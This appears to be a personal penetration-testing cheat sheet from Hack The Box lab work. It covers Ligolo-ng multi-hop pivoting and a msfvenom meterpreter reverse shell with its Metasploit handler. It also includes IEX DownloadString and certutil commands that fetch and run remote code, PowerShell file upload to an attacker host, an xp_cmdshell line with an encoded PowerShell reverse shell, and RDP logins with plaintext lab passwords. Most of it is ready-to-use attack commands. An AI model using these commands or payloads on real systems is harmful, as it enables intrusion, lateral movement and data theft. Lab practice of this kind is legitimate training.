Important note:
- Remember connect connect scan is an option if ping sweep or host is blocking ping request. 

## Connect scans
```
## Connect scan to bypass ping blocks
nmap -sT <host>
```

## Ligolo
```
start/single pivot:

cd ~/Desktop/htb/tools/ligolo-ng-0.5.2/
sudo ip tuntap add user eric mode tun ligolo
sudo ip link set ligolo up
ifconfig

python -m http.server

wget http://ip-addr:8000/agent.exe
certutil -urlcache -split -f "http://ip-addr:8000/agent.exe" 

./proxy -selfcert

.\agent.exe -connect <local host ip address>:11601 -ignore-cert
./agent -connect <local host ip address>:11601 -ignore-cert

session

start
sudo ip route add <subnet> dev ligolo

Double pivots/listenner addings:
sudo ip tuntap add user eric mode tun ligolo2
sudo ip link set ligolo2 up

On 1st pivot host, ligolo interface:
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:8000 --tcp

listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:<port for reverse shell> --tcp

start --tun ligolo2 (after receving connection)
sudo ip route add <subnet> dev ligolo2
ip route

On second pivot host:
	Agent set up:
	wget http://<ip_addr_pivot_1>:1234/agent.exe
	certutil -urlcache -split -f "http://<ip_addr_pivot_1>:1234/agent.exe" 
	
	.\agent.exe -connect <ip_addr_pivot_1>:11601 -ignore-cert
	./agent -connect <ip_addr_pivot_1>:11601 -ignore-cert

reverse shell set up
	eg.
	msfvenom -p windows/x64/meterpreter/reverse_https lhost= <ip_addr_pivot_1> -f exe -o backupscript.exe LPORT=12345
	
	On attack host:
	msf6 > use exploit/multi/handler
	
	[*] Using configured payload generic/shell_reverse_tcp
	msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
	payload => windows/x64/meterpreter/reverse_https
	msf6 exploit(multi/handler) > set lhost 0.0.0.0
	lhost => 0.0.0.0
	msf6 exploit(multi/handler) > set lport <port for reverse shell>
	lport => 8000
	msf6 exploit(multi/handler) > run 

On triple pivots:
sudo ip tuntap add user eric mode tun ligolo3
sudo ip link set ligolo3 up

On second pivot host:

listener_add --addr 0.0.0.0:11601 --to <ip_addr_pivot_1>:11601 --tcp

listener_add --addr 0.0.0.0:1234 --to  <ip_addr_pivot_1>:1234 --tcp

listener_add --addr 0.0.0.0:1235 --to <ip_addr_pivot_1>:1235 --tcp


start --tun ligolo3 (after receving connection)
sudo ip route add <subnet> dev ligolo3


On nth pivots:
sudo ip tuntap add user eric mode tun ligolo#num
sudo ip link set ligolo#num up

On nth-1 pivot host:

listener_add --addr 0.0.0.0:11601 --to <ip_addr_pivot_n-1>:11601 --tcp

listener_add --addr 0.0.0.0:1234 --to  <ip_addr_pivot_n-1>:1234 --tcp

listener_add --addr 0.0.0.0:1235 --to <ip_addr_pivot_n-1>:1235 --tcp

start --tun ligolo(n-1) (afte receving connection)
sudo ip route add <subnet> dev ligolo(n-1)
```

File uploads
```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.28:8000/PSUpload.ps1')
or
certutil -urlcache -split -f "http://10.10.16.28:8000/PSUpload.ps1"
Import-Module .\PSUpload.ps1


PS C:\htb> Invoke-FileUpload -Uri http://10.10.16.28:8000/upload -File C:\Users\htb-student\20240406195619_ILFREIGHT.zip
```
- Meet problem see the options in the module.

Cool stuff for lateral movement
```
cmd shell wiith powershell reverse shell

xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALg... base64_reverse_shell' <->
- adapted from https://www.revshells.com/, powershell base64 transfer
```

RDP stuff
```
xfreerdp +bitmap-cache /network:auto /dynamic-resolution /compression-level:2 /u:Bob /p:'HTB_@cademy_stdnt!' /v:10.129.53.208 /tls-seclevel:0 /timeout:80000

xfreerdp +bitmap-cache /network:auto /dynamic-resolution /compression-level:2 /u:Administrator /p:'AnotherC0mpl3xP4$$' /v:10.129.187.130 /tls-seclevel:0 /timeout:80000

xfreerdp +bitmap-cache /network:auto /dynamic-resolution /compression-level:2 /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.202.149 /tls-seclevel:0 /timeout:80000
```

Extra file transfer
```shell-session
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData ~/Desktop/htb/tools/windows_pe

move Too1ss.zip \\10.10.16.13\CompData

Powershell upload 
```

